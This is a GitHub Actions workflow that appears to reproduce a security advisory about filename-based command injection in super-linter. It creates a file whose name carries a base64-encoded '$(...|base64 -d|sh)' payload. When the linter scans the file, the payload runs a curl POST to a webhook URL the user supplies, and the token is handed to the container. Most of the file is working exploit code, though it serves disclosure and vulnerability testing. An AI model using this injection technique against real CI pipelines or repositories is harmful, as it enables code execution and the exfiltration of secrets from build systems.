name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'The tag of super-linter to test (e.g., v7, v8, slim-v8.2.1)'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Your webhook.site URL to receive the callback'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: 1. Generate Malicious Filename (The Exploit)
        run: |
          # 1. 定义我们要执行的攻击命令（包含斜杠，不能直接做文件名）
          ATTACK_CMD="curl -fsS -X POST \"${{ inputs.webhook_url }}\" -d \"vulnerable_version=${{ inputs.target_version }}\""
          
          # 2. 将命令进行 Base64 编码，消除特殊字符和斜杠
          # -w0 确保不换行
          ENCODED_CMD=$(echo -n "$ATTACK_CMD" | base64 -w0)
          
          # 3. 构造文件名
          # 这里的逻辑是：文件名包含 $(echo ... | base64 -d | sh)
          # 当漏洞触发时，它会解码并执行 sh，从而还原之前的 curl 命令
          PAYLOAD="pre\$(echo $ENCODED_CMD|base64 -d|sh).md"
          
          echo "Encoded Payload: $PAYLOAD"
          
          # 4. 创建文件（现在这是一个合法的文件名了，不含路径分隔符）
          touch "$PAYLOAD"
          
          # 验证文件是否创建成功
          ls -la

      # - name: 2. Run Super-Linter (Target Version)
      #   # We allow this step to fail because the linter might error out, 
      #   # but the injection happens during file discovery/initialization.
      #   continue-on-error: true 
      #   uses: super-linter/super-linter/slim@main # This is a placeholder
      #   # dynamic uses is not supported directly in GHA, so we use a different approach below
      #   # OR simply ask them to edit the 'uses' line. 
      #   # But actually, simpler approach for them:
        
      # Since we can't dynamically variable-ize the 'uses' clause in GitHub Actions easily,
      # strict reproduction usually asks them to hardcode the version, OR we use docker run manually.
      # But to respect your "Action context" requirement, let's use the docker container directly 
      # which mimics the action's behavior closely.
      
      - name: 2. Run Super-Linter via Docker (Exact Reproduction)
        run: |
          echo "Testing against image version: ${{ inputs.target_version }}"
          
          docker run --rm \
            -e RUN_LOCAL=true \
            -e VALIDATE_ALL_CODEBASE=true \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
            
      - name: 3. Check Result
        run: |
          echo "Please check your Webhook URL: ${{ inputs.webhook_url }}"
          echo "If you received a POST request, version ${{ inputs.target_version }} is VULNERABLE."
